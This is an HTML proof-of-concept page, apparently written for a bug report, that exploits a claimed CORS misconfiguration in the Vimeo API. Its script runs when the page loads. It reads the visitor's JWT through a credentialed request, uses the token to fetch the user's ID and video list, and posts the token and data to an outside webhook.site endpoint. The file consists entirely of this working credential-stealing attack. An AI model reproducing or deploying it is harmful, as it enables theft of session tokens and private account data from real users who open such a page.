<!DOCTYPE html>
<html>
<head>
  <title>Vimeo API CORS Misconfiguration PoC</title>
</head>
<body>
  <h1>Vimeo API CORS Misconfiguration PoC</h1>
  <pre id="output"></pre>

  <script>
    (async () => {
      const output = document.getElementById("output");
      const webhook = "https://webhook.site/your-id"; // replace with your webhook URL

      function log(msg) {
        console.log(msg);
        output.textContent += msg + "\n";
      }

      try {
        // Step 1: Get JWT from /upload/config
        log("[*] Fetching /upload/config...");
        const configResp = await fetch("https://api.vimeo.com/upload/config", {
          credentials: "include"
        });

        const configJson = await configResp.json();
        log("[*] /upload/config response received.");

        const jwtToken = configJson?.api?.jwt;
        const userId = configJson?.user?.id;

        if (!jwtToken) {
          log("[!] No JWT found in config response.");
          return;
        }

        log("[+] JWT extracted: " + jwtToken.substring(0, 30) + "...");

        let finalUserId = userId;

        // Step 2: If userId missing, fetch /me to resolve it
        if (!finalUserId) {
          log("[*] Fetching /me for user ID...");
          const meResp = await fetch("https://api.vimeo.com/me", {
            headers: {
              Authorization: "jwt " + jwtToken
            }
          });

          const meJson = await meResp.json();
          finalUserId = meJson?.id;

          if (!finalUserId) {
            log("[!] Could not resolve user ID from /me.");
            return;
          }

          log("[+] User ID resolved: " + finalUserId);
        }

        // Step 3: Fetch videos using JWT
        const vidsUrl = `https://api.vimeo.com/users/${finalUserId}/videos?per_page=10&page=1&fields=name,link,duration,privacy.view`;
        log("[*] Fetching user videos...");
        const vidsResp = await fetch(vidsUrl, {
          headers: {
            Authorization: "jwt " + jwtToken
          }
        });

        const vidsJson = await vidsResp.json();
        log("[+] Videos fetched: " + JSON.stringify(vidsJson, null, 2));

        // Step 4: Exfiltrate to webhook
        log("[*] Sending data to webhook...");
        await fetch(webhook, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            jwt: jwtToken,
            userId: finalUserId,
            videos: vidsJson
          })
        });

        log("[âœ“] Data exfiltrated to webhook.");
      } catch (err) {
        log("[!] Error: " + err);
      }
    })();
  </script>
</body>
</html>
